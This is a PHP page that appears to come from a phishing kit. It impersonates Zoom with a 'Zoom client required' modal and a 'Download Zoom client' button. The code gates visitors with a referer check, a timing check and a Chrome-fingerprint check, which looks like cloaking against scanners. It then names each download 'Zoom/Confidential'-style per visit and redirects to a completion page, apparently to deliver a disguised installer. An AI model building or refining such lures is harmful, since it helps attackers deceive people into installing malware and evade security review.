<?php
require __DIR__ . '/../lib.php';

// Step 2: must arrive from the entry page (root / or /index.php),
// >=4s after the token was minted (matches the 5s spinner), full Chrome
// fingerprint, same-origin referer.
gate_doc(['/', '/index.php', '/download.php'], 4, false);

$name  = make_name();   // fresh Zoom/Confidential name for THIS visit
$kind  = name_kind($name);
$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);
$dest  = "complete.php?tk=" . $tk . "&n=" . $nameQ;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Zoom</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
    body { height: 100vh; width: 100vw; background: linear-gradient(160deg, #1b2735 0%, #0f3460 55%, #16213e 100%); }
    .modal-overlay {
      position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
      background-color: rgba(0,0,0,0.45);
      display: flex; justify-content: center; align-items: center; z-index: 1000;
      padding: 16px;
    }
    .modal-content {
      background-color: white; padding: 34px 30px; border-radius: 10px;
      width: 90%; max-width: 500px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      animation: modalFadeIn 0.3s ease-out; text-align: center;
    }
    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
    .modal-header img { width: 92px; margin-bottom: 16px; }
    .modal-header h2 { font-size: 20px; color: #1a1a1a; font-weight: 600; margin-bottom: 10px; }
    .continue-btn {
      background-color: #0B5CFF; color: white; border: none;
      padding: 13px 30px; border-radius: 4px; font-size: 16px; font-weight: 600;
      cursor: pointer; margin-top: 22px; width: 100%; max-width: 250px;
      transition: background-color 0.3s;
    }
    .continue-btn:hover { background-color: #0a52e0; }
    .modal-text { color: #555; font-size: 14px; line-height: 1.5; margin-top: 0; }
    .modal-subtext { color: #777; font-size: 12.5px; line-height: 1.55; margin: 0; padding-top: 12px; }
    .info-text { color: #999; font-size: 12px; margin-top: 10px; }
    .spinner { display: none; margin-top: 20px; }
  </style>
</head>
<body>
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <div class="modal-header">
        <img src="assets/zoomicon.png" alt="Zoom">
        <h2>Zoom client required</h2>
      </div>
      <p class="modal-text">You need the Zoom desktop client to join this meeting.</p>
      <p class="modal-subtext">
        The client is free to download and install. It takes only a moment,
        and you can join the meeting as soon as it finishes installing.
      </p>
      <button onclick="submitForm()" id="continueBtn" class="continue-btn">Download Zoom client</button>
      <div id="spinner" class="spinner"><p>Loading...</p></div>
      <p class="info-text"></p>
    </div>
  </div>

  <script>
    function submitForm() {
      var btn = document.getElementById('continueBtn');
      var spinner = document.getElementById('spinner');
      btn.style.display = 'none';      // Hide button
      spinner.style.display = 'block'; // Show loading spinner
      setTimeout(function() {
        window.location.href = <?php echo json_encode($dest); ?>; // Redirect after 2 seconds
      }, 2000);
    }
  </script>
</body>
</html>
